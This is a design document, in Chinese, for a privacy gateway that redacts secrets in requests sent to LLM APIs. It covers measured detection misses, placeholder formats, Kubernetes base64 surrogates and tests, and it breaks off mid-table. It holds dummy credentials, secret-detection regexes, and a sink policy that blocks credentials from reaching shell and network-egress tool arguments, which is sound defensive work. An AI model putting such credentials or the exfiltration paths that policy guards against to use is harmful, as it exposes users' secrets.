# Cosy Redact Gateway v2 设计文档

- 基线：`main`，`package.json` 0.3.0，`worker.js` 890 行，零运行时依赖
- 状态：设计草案。第一批测试已落地（`test/` 四个文件，全量 67 tests / 60 pass / 7 fail），7 个失败项即本文档的目标行为规格
- 标记约定：**【实测】** 本机复现、数字可查；**【设计决定】** 已选定但未实现验证；**【待验证】** 需实验数据才能定稿

## 1. 背景与威胁模型

Cosy Redact Gateway 是客户端与上游 LLM API 之间的隐私中继：把请求体中的敏感值替换为占位符后上行，模型回显占位符时在出方向还原。

目标用户是维护 AWS / Kubernetes 环境的 DevOps 工程师，典型输入是整段 `kubectl describe` 输出、CloudTrail 事件 JSON、`.env`、Helm values、CI 日志与 Terraform 计划。

威胁模型沿用 `SECURITY.md`：上游可以存储或检查它收到的一切；中继不试图让不可信上游变得可信，只降低**误披露**面。防模型主动套取机密（prompt injection / 社工）不在当前范围内，由第 6.8 节的 sink 策略部分覆盖。

设计约束不变：单文件、零运行时依赖、只用 Web Fetch / Web Streams / Web Crypto，可运行于 Cloudflare Workers、Deno、Node 20+。

## 2. 现状基线（v0.3.0）

【实测】当前实现要点：

1. 路由 `https://<host>/<flags>$<upstream-url>`，flags 为 `HPSIBEG` 子集，空 flag 段表示全开（`parseFlags`）。
2. 请求体必须是 JSON（非 JSON 非空体 fail-closed 415），递归处理字符串叶子（`redactJson`），`shouldSkipString` 跳过控制字段与多模态二进制字段。
3. `findSensitiveSpans`（`worker.js:464`）已把各 detector 跑在**原文**上，再按 priority / 长度 / 起点做 overlap merge：`existing`(1000) > `gitleaks`(120) > `sk-`(110) > `identity`(100) > `email`(90) > `phone`(88) > `bank`(85) > `entropy`(10)。**检测顺序不是下述缺陷的成因**，3.1 的漏报发生在候选形成之前。
4. 占位符为 `{{Redact:<sha256(raw + runtime_salt)>}}`，固定 75 字节（`TOKEN_LENGTH`），同一 runtime 内同明文得到同一 token。
5. 响应侧分非流式（`restoreJson`）与流式 SSE（`SseRestorer`：按 channel 拼接 delta，保留可能是 token 前缀的后缀）。
6. Redact Notice 恒定注入最后一条 user 消息；未知 token 在所有方向原样透传，没有 sink 概念。

`H`（高熵）把文本切成 ASCII 字母数字块，块长 ≤ 8 或纯数字跳过，再用英文 bigram 交叉熵打分，阈值按长度线性插值（length=9 → 5.4240，length=17 → 5.1502），另加 Shannon 多样性下限。

## 3. 已实测确认的缺陷

### 3.1 密码类秘密的系统性漏报

现行 `generic-api-key` 规则（`worker.js:405`）的 value 字符类为 `(?:[\w.=-]{10,150}|[a-z0-9][a-z0-9+/]{11,}={0,3})`，不接受 `@ ! # $ % ^ & * ( )` 等符号；真实密码几乎都带符号，候选在 regex 阶段就不成立。高熵 detector 又按 `[A-Za-z0-9]+` 切块，符号进一步把候选切碎。

【实测】全部 flag 开启（`/$...`）：

| 输入 | 网关输出 | 判定 |
|---|---|---|
| `DB_PASSWORD=Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `DB_PASSWORD=hello123!` | 原样 | MISS |
| `password: Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `export TOKEN=Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `Authorization: Bearer Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `?access_token=Pr0d-P@ssw0rd-Xy9Zk2mQ` | 原样 | MISS |
| `AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` | `AWS_SECRET_ACCESS_KEY = {{Redact:7563cfc2…}}/K7MDENG/bPxRfiCYEXAMPLEKEY` | 部分 |

最后一行需精确表述：只有 `/` 之前的块 `wJalrXUtnFEMI` 被替换，`K7MDENG/bPxRfiCYEXAMPLEKEY` 仍以明文上行——该样本并未被"完整兜住"，只是被部分截断替换。

```bash
node -e 'import("./worker.js").then(async (m)=>{const c=new m.RedactionContext({salt:"repro"}),f=m.parseFlags("");for(const s of ["DB_PASSWORD=Pr0d-P@ssw0rd-Xy9Zk2mQ","DB_PASSWORD=hello123!","password: Pr0d-P@ssw0rd-Xy9Zk2mQ","export TOKEN=Pr0d-P@ssw0rd-Xy9Zk2mQ","Authorization: Bearer Pr0d-P@ssw0rd-Xy9Zk2mQ","?access_token=Pr0d-P@ssw0rd-Xy9Zk2mQ","AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"])console.log((await c.redactText(s,f))===s?"MISS":"HIT ",s)})'
```

根因（已进一步定位）：keyword 预筛**已经命中**——`DB_PASSWORD`、`password`、`TOKEN` 都在 `generic-api-key` 的 keywords 集合里。真正失败的是 value 字符类 `(?:[\w.=-]{10,150}|[a-z0-9][a-z0-9+/]{11,}={0,3})`，它不接受 `@` 和 `!`，真实密码几乎必然带这类符号，因此候选根本形成不了。对照实测（同一 key 名，只改 value 字符集）：

| 样本 | 判定 |
|---|---|
| `DB_PASSWORD=Pr0d-P@ssw0rd-Xy9Zk2mQ` | MISS（`@`） |
| `DB_PASSWORD=hello123!` | MISS（`!`） |
| `DB_PASSWORD=Pr0d-Passw0rdXy9Zk2mQ` | HIT |
| `DB_PASSWORD=SuperSecret123` | HIT |
| `DB_PASSWORD=cGFzc3dvcmQxMjM0NTY3OA==` | HIT |

所以这一项的修法不是"补 key 名识别"（key 名条件已满足），而是**先解析绑定形式、再取整个 value**——即结构化上下文提取，而不是继续加宽 value 字符类（后者只会把误报面一起放大）。测试：`test/structured-context.test.js`。

### 3.2 占位符 `{{Redact:…}}` 破坏宿主语法

`{` 在 YAML 中是 flow mapping 起始符，`{{Redact:abc}}` 会被解析成嵌套映射而不是标量。

【实测·已修正】PyYAML 6.0.1：`password: {{Redact:abc}}` → `ConstructorError: while constructing a mapping`。

【修正说明】`{{Redact:<64 hex>}}` 单看是**合法**的 YAML flow mapping（`{ {Redact:…} }` 嵌套），也就是说它的危害**不是"解析失败"，而是"类型被改写"**：字段本来是 string，替换后成为 mapping。仓库内最小校验器据此断言的是类型改写而非解析错误，见 `current placeholder is unusable in Kubernetes and other typed fields [GREEN NOW]`。真实 K8s 场景下危害是确定的：`Secret.data` 要求 base64，花括号占位符不是合法 base64（见 3.5）。

影响面是 YAML（Helm values、K8s 清单、CI 配置、Ansible）：下游解析器直接拒绝或误解析，模型会去分析一个本来不存在的语法错误。`.env`、shell、URL query、HTTP header 不受影响（`{` 在那里只是普通字符），但 shell 中必须加引号，这一点已由 `current placeholder leaves URL and header usable, but needs shell quoting [GREEN NOW]` 固化。

【待验证】同一 `{{ }}` 定界符与 Helm/Go template 冲突（Helm 渲染 `{{ ... }}` 会报模板错误）。本机未做 helm 渲染验证，但属同一根因，v2 选型一并规避。

### 3.3 高熵判据与基础设施域系统性错配

`H` 的判据是"看起来随机"，而 AWS / K8s 世界里几乎所有基础设施标识都看起来随机，且它们恰好是排障唯一的关联抓手。

【实测】`H` 判定：

| 样本 | 块长 | entropy 分数 | 阈值 | 判定 |
|---|---:|---:|---:|---|
| `0a1b2c3d4e5f67890`（实例 ID 后缀） | 17 | 7.3725 | 5.1502 | REDACT |
| `0a1b2c3d4e5f6789`（安全组 ID 后缀） | 16 | 7.4997 | 5.1799 | REDACT |
| `7d9f8c6b5d`（ReplicaSet hash） | 10 | 7.2845 | 5.3667 | REDACT |

`i-0a1b2c3d4e5f67890` 输出 `i-{{Redact:f752d970…}}`，`subnet-0a1b2c3d4e5f67890` 输出 `subnet-{{Redact:f752d970…}}`：前缀保留、值被替换，替换后既不是合法资源 ID，也无法再与真实资源对应。附带发现：token 只由明文决定，上述两个不同资源得到**同一个** token，在模型视角被合并成一个实体。

```bash
node -e 'import("./worker.js").then(m=>{for(const b of ["0a1b2c3d4e5f67890","0a1b2c3d4e5f6789","7d9f8c6b5d"])console.log(b,m.entropyScore(b).toFixed(4),m.entropyThreshold(b.length).toFixed(4),m.isHighEntropyBlock(b))})'
```

对照：`eks-prod-nodegroup-ng-1` 的 `nodegroup` 块分数 4.3468 < 阈值 5.4240，不被替换——`H` 在这类文本上删掉的恰好是标识的随机部分。

### 3.4 主张流程：样本合法性优先

过程中出现过 4 次错误结论，全部源于不合法的样本或未验证的推理。两个已查证案例：

- 曾断言 Gitleaks 的 AWS 规则 `[A-Z2-7]{16}` 是 bug（"应为 `[A-Z0-9]`"）。官方源码 `cmd/generate/config/rules/aws.go` 确认 `[A-Z2-7]` 正确，紧邻注释为 `current AWS tokens cannot contain [0,1,8,9]`；构造样本 `AKIAJ9X2K4M7P3Q8R5T6` 含 `9`，是 AWS 永不签发的字符串。
- 曾用只有 17 个 base64 字符的过短 PEM 样本断言 PGP 私钥漏报。本仓库 `private-key` 规则要求 `[\s\S-]{64,}`；合法长度样本能被拦住。

**流程规则（进入 backlog 的门槛）**：任何"漏报 / 误报"主张必须同时附带（1）可复现样本（原始输入，不截断、不改写）；（2）样本合法性证明（官方文档 / 上游源码 / 真实服务接受的证据，含来源与版本）；（3）一条可直接执行的复现命令。三者缺一不进 backlog、不进测试。

### 3.5 K8s `Secret.data` 必须是合法 base64

【实测】真实 API server（client `v1.36.3` / server `v1.35.1`，minikube，`kubectl apply --dry-run=server`）：

| `data.password` 取值 | 结果 |
|---|---|
| `CRG_K7M2Q9_T8F4N6P3` | `BadRequest: … illegal base64 data at input byte 3` |
| `Q1JHX0FCQ18xMjM=` | `secret/crg-b64-test created (server dry run)` |
| `Q1JHX0FCQ18xMjM`（缺填充） | `illegal base64 data at input byte 12` |
| `Q1JHX0FCQ18xMjM==`（多填充） | `illegal base64 data at input byte 16` |

K8s 只校验能否 base64 解码，不校验解码后的长度。`Q1JHX0FCQ18xMjM=` 正是 `base64("CRG_K7M2Q9_T8F4N6P3")`：把 token 再 base64 可行，直接塞 portable token 不可行，填充位必须严格正确。

```bash
printf 'apiVersion: v1\nkind: Secret\nmetadata:\n  name: crg-b64-test\ntype: Opaque\ndata:\n  password: CRG_K7M2Q9_T8F4N6P3\n' | kubectl apply --dry-run=server -f -
```

### 3.6 分层 DLP 的三组对照

【实测】完整 tool-call 回路模拟（网关 + 外层 DLP + 本地磁盘 `grep`），观测模型发出的 `grep` 模式与命中行数；已固化为 `tool-call fidelity depends on the outer layer, not on wrapping [GREEN NOW]`：

| 配置 | 模型发出的 grep 模式 | 磁盘命中行数 |
|---|---|---:|
| A：网关二次脱敏 + 外层 DLP 只覆盖入方向 | `CRG_K7M2Q9_T8F4N6P3` | 0 |
| B：网关二次脱敏 + 外层 DLP 同时覆盖出方向 | 真实明文 | 1 |
| C：网关原样透传外来 token | `CRG_K7M2Q9_T8F4N6P3` | 0 |

结论：决定性变量是**外层 DLP 是否在出方向还原**，不是网关是否包装外来 token。配置 C 比 A 更糟——模型自信地 grep 一个伪值并据此给出结论。"namespace ownership 导致打空"既不成立，也不是成因。

【实测】二次脱敏的触发条件（全 flag，`DB_PASSWORD=<token>` 上下文，已固化为 `current gateway re-wraps most foreign tokens [GREEN NOW]`）：`CRG_K7M2Q9_T8F4N6P3`、`VAULT_TOKEN_xyz789`、`MASKED_abc123def456`、32 位 hex 全部被重新包装；`[[PII_EMAIL_1]]` 因 `[` 不在 value 字符类中原样透传；`api_key=deadbeefdeadbeefdeadbeef` 因过不了 entropy 3.5 门限原样透传。触发条件是 `generic-api-key` 规则（左侧 key 名匹配 + value 字符类 + entropy 门限），不是高熵——这解释了"外来 token 被二次包装"与"高熵误删"为何是两个独立问题。

## 4. 根因归纳

| 编号 | 根因 | 对应缺陷 |
|---|---|---|
| R1 | 判定入口只有 value 形状，key 名只做 keyword 预筛，上下文未进入判定 | 3.1 |
| R2 | 判据与域错配：entropy 度量"像不像随机"，而基础设施标识天然随机 | 3.3 |
| R3 | 表征不分层：一个 75 字节字符串 token 被塞进所有位置，忽略宿主语法与类型约束 | 3.2 / 3.5 |
| R4 | 没有 sink 概念：还原策略与输出通道无关 | 3.6 C |
| R5 | 跨层归属未定义：两层 DLP 各自持有一半映射 | 3.6 A |

## 5. 设计原则

### 5.1 分层唯一归属原则（核心原则）

**同一份数据应当只有一层拥有映射。**

- **独占（EXCLUSIVE）**：网关持有映射，并在自己的出方向边界把 token 还原成明文交给下游；下游不得再对同一路径做还原。
- **纯透传（PASS_THROUGH）**：网关完全不参与该路径——不为其创建 token、不改写、不还原，外来 token 原样进、原样出。

**禁止"参与一半"**：两层 DLP 各自持有一半映射、都不完整时，中间产物既不是明文也不是终态——模型看到伪值（配置 C），或下游拿到一个谁都无法还原的 token（配置 A）。归属必须显式声明、可观测、可测试。

推论：（1）模式是**路由级 / 路径级**配置而非隐式行为，配置 A 与 C 在 v2 中都属配置错误，应被拒绝启动或告警；（2）独占模式下网关必须能证明"我发出的每个 token 我都能还原"，纯透传模式下必须能证明"我一个字节都没改"；（3）还原保真与归属无关——即使网关二次包装了外来 token，只要它能精确还原，外层 DLP 仍可继续完成自己的还原（`re-wrapping preserves the value through the full round trip [GREEN NOW]`），纯透传是语义正确的选择，不是"修复打空"的手段。

### 5.2 证据分级

确定性证据优先于概率证据；ML 不得推翻确定性规则（见 6.3）。

### 5.3 parser 是增加结构证据，不是新的安全边界

解析失败的区域必须计入 UNKNOWN 并继续走后续 detector（见 6.7）。

### 5.4 一切主张可复现

测试与缺陷主张必须满足 3.4 的三项门槛。

## 6. 目标架构

### 6.1 管线总览

```text
request body
  ├─[1] Structured Context Extraction (SCE)   路径 + 内嵌微格式 + key 名
  ├─[2] Candidate generation                   格式规则 / value 形状 / entropy / ML
  ├─[3] Evidence grading                        HARD_SECRET | SOFT_SIGNAL
  ├─[4] Infrastructure identifier recognition   AWS / K8s / Git / trace / UUID …
  ├─[5] Policy decision                         preserve | mask | redact(type)
  ├─[6] Surrogate materialization               portable token | base64 surrogate | 不可替换 → fail-closed
  ├─[7] Coverage ledger                         PARSED | PARTIAL | FAILED(=UNKNOWN) + telemetry
  ▼
untrusted upstream model
  ▼
[8] Tool Sink Policy ── assistant text: restore ── tool argument: 默认保持 token ── broker: restore
```

### 6.2 Structured Context Extraction

【设计决定】对每个字符串叶子同时产出两级上下文：

1. **外层 API 路径**：`messages[3].content`、`tools[2].function.parameters.properties.password`、`input[0].content[1].text` 等，来自现有 `redactJson` 的 path 数组。
2. **内嵌微格式**：在字符串内部识别 `.env`（`KEY=VALUE` 行）、YAML（`key: value`）、shell（`export KEY=…`、`KEY=… cmd`）、HTTP header（`Name: value`）、URL query（`?k=v&k2=v2`），产出 `{ region, container, keyName, keyPath }`。

判定优先级：**key 名 > 容器语义 > value 形状**。`DB_PASSWORD`、`password`、`api_key`、`access_token`、`Authorization: Bearer`、`x-api-key` 命中时，value 只需满足"非平凡字符串"即可进入 SOFT_SIGNAL，容器可信时可直接进入 HARD_SECRET。SCE 失败必须降级而非中止：无法识别的区域标记 UNKNOWN，仍走全部 detector。

### 6.3 Hard / Soft 证据分级

【设计决定】

- `HARD_SECRET`：格式明确 + 独立 validator + 正样本集 + 负样本集 + **infra golden corpus 零误删**。满足者直接判定为秘密，ML 分值不得推翻。例：`sk-ant-api03-…`（前缀 + 长度）、Luhn 通过的卡号、PRC 身份证校验位、JWT 三段结构、provider 前缀类规则。
- `SOFT_SIGNAL`：entropy 分数、通用 token 形状、关键词邻近度、分类器分数。只能作为候选，必须可被上下文修正——key 名、容器类型、infra 类别、policy 都可提升或压制它。

`H` 从"最终 verdict"降级为 candidate signal 是本次架构变更的核心。

### 6.4 Infrastructure identifier 识别

【设计决定】单独识别并分类，不写死 "INFRA = 安全"：AWS ARN / 实例 ID / AMI / region / account / requestID（`arn:aws:iam::123456789012:role/x`、`i-…`、`ami-…`、`us-west-2`、`123456789012`）、Git 对象（40 / 64 位 hex SHA）、容器镜像（`sha256:…` digest、`repo/name:tag`）、K8s（UID、nodegroup 名、namespace / 资源名）、分布式追踪（trace ID 32 hex、span ID 16 hex）、通用（UUID 按版本、CIDR / IP、主机名）。分类结果交给 policy：`preserve`（默认，保留排障关联抓手）/ `mask` / `redact`。ARN 可能内嵌 account ID，需按子结构给策略，而不是整类放过。

### 6.5 Token 规范

【设计决定】

```text
CRG_<request-id>_<entity-id>
```

- **严格两段**，语法 `^CRG_[A-Z0-9]{4,}_[A-Z0-9]{4,}$`，实现为 `CRG_<requestId:6>_<entityId:4>`（15 字符）。`TOKEN_LENGTH` **由宽度常量派生，不得硬编码**——硬编码会在流式测试里以极难排查的方式失败（断言在上游 fetch 回调内抛出，请求降级为 502 与空流）。
- 边界断言用**否定字符类** `(?<![A-Za-z0-9_])…(?![A-Za-z0-9_])`，不能用 `\b`：`_` 是词字符，`\b` 在 `…_CRG_` 这类拼接处不成立，会漏配合法 token。
- 字符集不含 `{ } " ' : @ ! = & ? / +`，`[A-Z0-9_]` 在 URL query（RFC 3986 unreserved）、shell、`.env` key、YAML plain scalar、HTTP header 中都不需要转义。
- **受保护 span 的资格只能来自登记，不能来自形状**：`findSensitiveSpans` 不做任何形状 fallback，未传资格即保护为空；`RedactionContext` 以谓词 `isProtectedToken = (v) => tokenToRaw.has(v)` 提供资格。这既支持"铸号过程中产生的新 token"（legacy 重新铸号），也避免任何人用 `CRG_` 形状的标签把秘密夹带过检测。
- `request-id` 每请求随机生成；`entity-id` 每实体随机生成，**禁止自增计数**，也禁止任何由明文派生的取值。
- 同一请求内同一明文复用同一 token；跨请求必须重新随机。
- **不带任何由原文派生的 checksum**：派生校验位会给低熵秘密（PIN、卡号、短密码）提供离线猜测验证器。该风险已量化为测试：对 `0000 / 1234 / 9999` 取 `djb2` 哈希，高 16 位几乎恒定（`7c53`–`7c58`），只有低位可分（低 2 位 hex 分别为 `05 / 41 / 45`）——"看起来很强"的高位截断 checksum 在它本该保护的候选空间上几乎是常量。
- token 必须自识别（固定前缀），使未知 token 能被识别为"受保护形状"而不是普通文本（见 6.8、8.4）。

### 6.6 Representation / schema 约束需要 surrogate

【设计决定】替换件形态由**位置**决定，而不是全局统一：

| 位置 | 替换件 |
|---|---|
| 普通字符串 / JSON string / 文本 | portable token |
| K8s `Secret.data.*`、`dockerconfigjson`、HTTP Basic、任意已知 base64 位 | base64 surrogate = `base64(token)`，填充位严格正确（依据 3.5 实测） |
| URL query / path | portable token（无需 percent-encode） |
| 类型受限位置（JSON number / boolean / enum / 有 schema 的字段） | 不替换成字符串：按 policy 取 `preserve` / 同类型 mask / `redact` 后 fail-closed |

还原以请求内映射表为准，按字面量匹配对应的 surrogate 形式，不对任意 base64 做启发式解码；surrogate 必须**永不解码出明文**（`base64 decoding the surrogate must never reveal plaintext [RED]`）。

【设计决定】流式还原的 token 长度不再固定：`possibleTokenSuffixLength` 改为按 `CRG_` 前缀 + 语法上界保留后缀（当前硬编码 75 字节，`worker.js:646`）。

### 6.7 Parser coverage 可观测

【设计决定】每个区域产出覆盖记录 `{ region, parser, status: PARSED | PARTIAL | FAILED, bytes }`。`FAILED` 区域计入 `UNKNOWN`，**继续走后续 detector**；绝不允许解析失败成为"跳过检测"或"视为可信"的理由。UNKNOWN 比例进入按请求的 telemetry（只记计数与区域路径，不记内容），可配置为告警或 fail-closed。

### 6.8 Tool Sink Policy（Agent 场景 P0）

【设计决定】还原判定收敛到一个显式接口：

```text
classifyRestore({ text, sink }) -> { action: "preserve" | "block", telemetry: { event } }
```

| Sink | 默认行为 | 理由 |
|---|---|---|
| `assistant_text` | 还原明文；未知 token 透传 + telemetry | 人类阅读路径 |
| `shell` / `network_egress` / `database` / `email` | **不还原**；未知 token 阻断 | 参数会被客户端 / 宿主执行，把凭据还原进 `bash -c` 一类参数等于制造 confused deputy |
| `log_write` 等良性 sink | 透传 | 仅形状不足以阻断 |
| tool result（上行） | 脱敏 | 现有行为，保持 |
| 可信 broker（显式鉴权） | 允许还原 | 唯一例外，需 sink allowlist + 调用方身份 |

阻断条件必须**三个同时成立**：未知 ∧ 受保护形状 ∧ 敏感 sink；任一不成立都不得阻断，否则 `trace_id`、`request_id`、opaque application id、K8s 资源名、ARN 会被误伤。默认不还原会让部分工具调用因拿到 token 而失败，这是可接受的失败模式；配套要求是 notice 向模型说明"该参数不可直接使用，需要 broker"。

### 6.9 Policy 决策表

【设计决定】`verdict × class × sink → action` 三轴独立：`verdict` ∈ {`HARD_SECRET`, `SOFT_SIGNAL`, `INFRA`, `UNKNOWN`}；`class` ∈ {`secret`, `pii`, `infra`, `opaque`}；`sink` ∈ {`upstream_request`, `assistant_text`, `tool_argument`, `telemetry`}。`UNKNOWN` 落到 fail-closed 一侧（如 6.8 的阻断条件），而不是默认放过。

### 6.10 可复现性基线

【设计决定】`test/fixtures/` 约定：每个 fixture 带 `input`、`expected`、`source`（官方文档 / 上游源码链接 + 版本）、`legal: true` 与复现命令；缺 `source` 的 fixture 直接失败，把 3.4 的门槛强制在测试层。

## 7. 数据模型（草案）

```text
Candidate { span, detector, evidence: HARD|SOFT, score, ruleId }
Context   { jsonPath, container: json|dotenv|yaml|shell|header|urlquery, keyName, keyPath, coverage }
Entity    { plaintext, cls: secret|pii|infra|opaque, verdict, token, surrogateForm, policyAction }
Sink      { kind, restore: bool, reason }
```

不变量：（1）`token = f(requestNonce, entityId)`，与 plaintext 无关，同请求同明文复用、跨请求不复用；（2）任一 token 至少有一个已物化 surrogate 形式，还原按字面量匹配；（3）独占模式下出方向必须覆盖所有已物化形式，纯透传模式下不得产生任何 token。

## 8. 第一批测试与验收断言

四个文件已落地，`npm test` 驱动。标记沿用测试文件头部：`[GREEN NOW]` 对当前 `main` 通过（固化现状）；`[RED]` 对当前 `main` 失败（目标行为，即实现完成的验收条件）；`[COUPLING]` 现在通过只是因为生产代码尚未输出目标格式，迁移后必须继续通过。

【实测】当前全量结果：**67 tests / 60 pass / 7 fail / 0 skipped**，7 个失败项即下方标 ★ 的用例。

### 8.1 `test/token-syntax.test.js`（7 例）

- `current placeholder is unusable in Kubernetes and other typed fields [GREEN NOW]` — 现行 `{{Redact:…}}` 不是合法 base64、且内含 `{` 与 `:`，会把 YAML 字段从 string 改写成 mapping（见 3.2 修正说明）。
- `current placeholder leaves URL and header usable, but needs shell quoting [GREEN NOW]` — 现行占位符在 URL query 与 header 中可直接使用，shell 中必须加引号。
- ★ `plaintext-derived checksum is an offline verification oracle [RED]` — 明文派生 checksum 可离线验证猜测（fixture 能区分 `0000/1234/9999`）；目标 token 只有 `[requestId, entityId]` 两个分量，任一分量都不可由明文重算。
- ★ `portable token is a valid YAML plain scalar and shell-safe [RED]` — **纯 token 契约，与 detector 解耦**：不经脱敏，直接断言目标 token 是合法 YAML plain scalar、无需 shell 引号、可作 `.env` key。
- `redacted output is syntactically valid in every host syntax [COUPLING]` — 脱敏产物在五种宿主里语法合法；夹具刻意选用当前 detector **已能检出**的值，使该用例只度量 token 语法。
- ★ 新增 `test/structured-context.test.js`（9 例，5 红）：`.env`/YAML/shell/header/URL 六种绑定形式的漏报，含 4 条 `[GREEN NOW]` 定位用例（证明 keyword 门槛已满足、失败在 value 字符类）与 5 条 `[RED]` 目标用例。
- `portable token is usable as an .env key and as a URL/header value [RED]` — token 满足 `.env` key 语法、`encodeURIComponent(token) === token`、是合法 header value。
- `redaction round-trip is byte-identical for every host syntax [COUPLING]` — 对 YAML / `.env` / shell（带引号）/ header / URL query 五种宿主，`restoreText(redact(text)) === text` 逐字节一致。
- `redaction is idempotent and never nests placeholders [GREEN NOW]` — 二次脱敏不再包装已脱敏值，占位符数量恒为 1。

文件内的 `targetToken()` 只是**形态占位**，entity id 由 `djb2(明文)` 派生，属明文派生分量，实现不得照抄（见第 10 节）。

### 8.2 `test/nested-dlp.test.js`（5 例）

- `current gateway re-wraps most foreign tokens [GREEN NOW]` — 现行实现对 `CRG_…` / `VAULT_TOKEN_…` / `MASKED_…` / 32 位 hex 四类外来 token 全部二次包装，只有含方括号的 `[[PII_EMAIL_1]]` 意外透传。
- `re-wrapping preserves the value through the full round trip [GREEN NOW]` — 二次包装后本层仍能精确还原，外层 DLP 可继续完成自己的还原——"嵌套 DLP 静默丢明文"不成立。
- ★ `registered foreign token must pass through unchanged [RED]` — 已登记外来 token 满足 `input_to_gateway === model_visible === gateway_output`。
- `unregistered secrets are still redacted (no blanket pass-through) [GREEN NOW]` — 未登记的普通秘密仍必须脱敏，透传不能变成一刀切。
- `tool-call fidelity depends on the outer layer, not on wrapping [GREEN NOW]` — 三配置 A/B/C 命中行数 0 / 1 / 0；只有外层 DLP 出方向还原才能让工具调用命中明文。

关键区分：正确的不变量是 `input_to_gateway === model_visible === gateway_output`，**不是**通用的 `model_visible === restored`——正常脱敏本来就让后者不同（`client 发 AKIA… → 模型看到 GW_TOKEN → 客户端收到 AKIA…`）。

### 8.3 `test/k8s-surrogate.test.js`（7 例，2 例需要真实集群）

- `a plain portable token is not accepted by Secret.data [RED] [SKIP-ABLE]` — portable token 不是合法 base64，API server 拒绝并返回 `illegal base64 data`。
- `base64 surrogate of a portable token is canonically padded [RED]` — surrogate 是规范 base64（字符集、`len % 4 === 0`、无多余填充），且解码回 token。
- `padded and unpadded variants are distinguishable (padding is load-bearing) [RED]` — 缺填充与多填充必须被本地严格校验拒绝，不能等 API server 报错。
- `API server accepts the base64 surrogate [RED] [SKIP-ABLE]` — 真实 API server 接受 surrogate。
- `API server rejects a wrongly padded surrogate [GREEN NOW] [SKIP-ABLE]` — 缺填充被 API server 拒绝（失败模式回归）。
- `surrogate length is independent of plaintext length [GREEN NOW]` — surrogate 长度只跟踪 token，不跟踪明文；K8s 不校验解码后长度。
- `base64 decoding the surrogate must never reveal plaintext [RED]` — surrogate 解码后既不含明文也不含明文的 base64，防止"surrogate 其实是明文的 base64"这种静默失效。

无集群时 `[SKIP-ABLE]` 自动跳过，离线断言（规范 base64、严格填充）始终执行——手写 base64 的填充 bug 正是 K8s 会直接拒绝的地方。

### 8.4 `test/restore-miss.test.js`（7 例）

- `unknown token is passed through unchanged today [GREEN NOW]` — 现行实现原样透传未知 token。
- `known token restores in both assistant text and tool arguments [GREEN NOW]` — 已登记 token 在助手文本与 tool 参数中都还原（当前没有 sink 区分）。
- `assistant prose and tool arguments are handled identically today [GREEN NOW]` — 固化"当前无 sink 概念"这一事实。
- ★ `unknown token in assistant text: pass through, no block [RED]` — `action === "preserve"` 且 `telemetry.event === "restore_miss"`。
- ★ `unknown token + protected shape + sensitive sink: BLOCK [RED]` — 对 `shell` / `network_egress` / `database` / `email` 四种敏感 sink，`action === "block"` 且 `telemetry.event === "restore_miss_blocked"`。
- ★ `unknown token in a benign sink is not blocked [RED]` — `log_write` 等良性 sink 仅凭形状不得阻断。
- ★ `non-protected identifiers are never blocked, even in sensitive sinks [RED]` — trace id、UUID 形式 request id、`app_01J8ZK9Q2M4N7P`、K8s 资源名、AWS ARN 在 `shell` sink 下都不得阻断。

这 4 个用例共用目标接口 `classifyRestore({ text, sink })`，阻断条件被断言为「未知 ∧ 受保护形状 ∧ 敏感 sink」三者同时成立。

## 9. 迁移与兼容

【设计决定】出方向只发新 token（`CRG_…`），入方向还原在过渡期同时接受 `{{Redact:<64hex>}}` 与新格式以便灰度，且 `redaction is idempotent and never nests placeholders` 必须继续通过；Redact Notice 文案需重写（现有文案显式描述 `{{Redact:sha256}}`）；`H` 保留为 flag 但语义从"判定"变为"候选信号"，`/$...` 全开行为需在 README 与本文件重新表述；SSE 还原器按 6.6 改造。

`[GREEN NOW]` 用例是行为快照：迁移后其中一部分（如 `current placeholder is unusable in Kubernetes and other typed fields`、`current gateway re-wraps most foreign tokens`、`assistant prose and tool arguments are handled identically today`）应当**失败或改名**，改动必须显式提交，不允许顺手改断言。

分组边界：`token-syntax` 只管 token 格式契约，`structured-context` 只管 detector 覆盖，两者不得互相耦合——否则任一侧的红绿都会给出错误信号。

## 9.1 迁移状态（token 格式）

双格式是过渡态，不是终态：

| 方向 | 状态 |
|---|---|
| 生成 | **只产出 v2**（`CRG_…`）。由 `legacy-token-compat.test.js` 的 `generation never emits the legacy format` 固定。 |
| 还原 | 短期同时识别两种格式，映射表查找是唯一权威：未登记的 token 一律原样保留（既不还原也不改写）。 |
| 输入侧 legacy | 已登记在映射里的 v1 token 会被**重新铸号为 v2**，使同一段对话不出现两种方言；映射在重铸前后保持可用。 |
| 既有测试 | 主链路（`core` / `proxy` / `stream` / `http-integration` / `node-server`）已全部改为格式无关断言（`REDACTED_TOKEN` / `isRedactedText`），不再匹配某一种 token 字面量。 |
| legacy 收口 | 只有 `test/legacy-token-compat.test.js` 触碰 v1 格式（6 例）。待其余消费者迁完，把该文件压缩到最小集合，并删除 `restoreText` 的 legacy 分支与 `LEGACY_TOKEN_*` 常量。 |

迁移期实测到的两个坑，已固化为回归：

1. `assert.match(x, GLOBAL_RE)` **不可用**：带 `g` 的正则 `.test()` 有 `lastIndex` 语义，断言会随调用次数翻转。断言统一用 `isRedactedText()` 或非全局正则。
2. 用 `out.includes("{{Redact:")` 之类**字面量判据**判断"是否被脱敏"，在格式迁移后会静默失真（新格式下恒为 false）。所有此类判据已改为 `isRedactedText()`。

## 9.2 Restore-Miss Policy（已实现；完整 Tool Sink Policy 见 10）

**命名更正**：本节实现的是 **Restore-Miss Policy**，不是完整的 Tool Sink Policy。完整的 Tool Sink Policy 还需要 `entity sensitivity/class` 的来源与 `sink destination allowlist`（见第 10 节）。把它当作已完成会掩盖这条 exfiltration 路径。

实现：`classifyRestore({ ctx, text, sink }) -> { action, text, unknownTokens, blockedTokens, telemetry }`，动作取自 `RESTORE_ACTION`（`restore` / `preserve` / `block`），敏感 sink 集合是 `SENSITIVE_SINK_KINDS`（`shell` / `network_egress` / `database` / `email`）。

**已登记 token 不等于可无条件下发。** 决策现在是四维：token ownership × entity 类别 × sink kind × sink trust。

| 情形 | 动作 |
|---|---|
| 已登记 + assistant 文本 / 非敏感 sink | restore |
